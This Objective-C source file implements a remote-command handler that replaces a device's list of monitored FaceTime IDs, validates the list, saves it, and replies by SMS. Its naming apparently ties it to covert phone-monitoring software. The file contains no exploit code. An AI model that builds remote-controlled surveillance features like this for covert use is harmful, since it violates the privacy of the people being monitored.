//
//  ResetMonitorFacetimeIDProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 7/10/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ResetMonitorFacetimeIDsProcessor.h"
#import "PrefMonitorFacetimeID.h"
#import "Preference.h"

@interface ResetMonitorFacetimeIDsProcessor (PrivateAPI)
- (void) processResetMonitorFacetimeIDs;
- (void) resetMonitorFacetimeIDsException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canResetMonitorFacetimeIDs;
@end


@implementation ResetMonitorFacetimeIDsProcessor

@synthesize mFacetimeIDs;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetMonitorFacetimeIDsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ResetMonitorFacetimeIDsProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetMonitorFacetimeIDsProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ResetMonitorFacetimeIDsProcessor
 - Argument list and description: 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"ResetMonitorFacetimeIDsProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {		
		
		mFacetimeIDs = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kFacetimeIDValidation]];		
		DLog(@"ResetMonitorFacetimeIDsProcessor--->Facetime IDs:%@",mFacetimeIDs);
		if ([mFacetimeIDs count] > 0 ) {
			if ([self canResetMonitorFacetimeIDs])
				if (![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mFacetimeIDs])
					[self processResetMonitorFacetimeIDs];
				else 
					[self resetMonitorFacetimeIDsException:kCmdExceptionErrorCannotAddDuplicateToMonitorFacetiemIDList];
			else
				[self resetMonitorFacetimeIDsException:kCmdExceptionErrorFacetimeIDExceedListCapacity];
		}
		else {
			[self resetMonitorFacetimeIDsException:kCmdExceptionErrorInvalidFacetimeIDToMonitorFacetimeIDList];
		}
	} else {
		[self resetMonitorFacetimeIDsException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark ResetMonitorFacetimeIDsProcessor PrivateAPI Methods

/**
 - Method name: processResetMonitorFacetimeIDs
 - Purpose:This method is used to process reset FacetimeIDs
 - Argument list and description: No Argument
 - Return description: No Return type
 */

- (void) processResetMonitorFacetimeIDs {
	DLog (@"ResetMonitorFacetimeIDsProcessor--->processResetMonitorFacetimeIDs");
	id <PreferenceManager> prefManager	= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorFacetimeID *prefMonitorFacetimeID		= (PrefMonitorFacetimeID *) [prefManager preference:kFacetimeID];
	NSMutableArray *monitorsArray		= [[NSMutableArray alloc] init];
	[prefMonitorFacetimeID setMMonitorFacetimeIDs:mFacetimeIDs];
	[monitorsArray release];
	[prefManager savePreferenceAndNotifyChange:prefMonitorFacetimeID];
	[self sendReplySMS];
}

/**
 - Method name: canResetMonitorFacetimeIDs
 - Purpose:This method is used to check the maximum limit(FACETIME_IDS_LIST_CAPACITY) for reset Monitor Facetime ID. 
 - Argument list and description: No Argument
 - Return description: BOOL
 */

- (BOOL) canResetMonitorFacetimeIDs {
	DLog (@"ResetMonitorFacetimeIDsProcessor--->canResetMonitorFacetimeIDs")
	//id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	//PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	int count = [mFacetimeIDs count];
	if (count <= FACETIME_IDS_LIST_CAPACITY) {
		return YES;
	} else {
		return NO;
	}
}

/**
 - Method name: resetMonitorFacetimeIDsException
 - Purpose:This method is invoked when  reset FacetimeIDs process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) resetMonitorFacetimeIDsException: (NSUInteger) aErrorCode {
	DLog (@"ResetMonitorFacetimeIDsProcessor--->resetMonitorFacetimeIDsException")
	FxException* exception = [FxException exceptionWithName:@"resetMonitorFacetimeIDsException" andReason:@"Reset Facetime ids error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"ResetMonitorFacetimeIDsProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[mFacetimeIDs release];
	[super dealloc];
}


@end
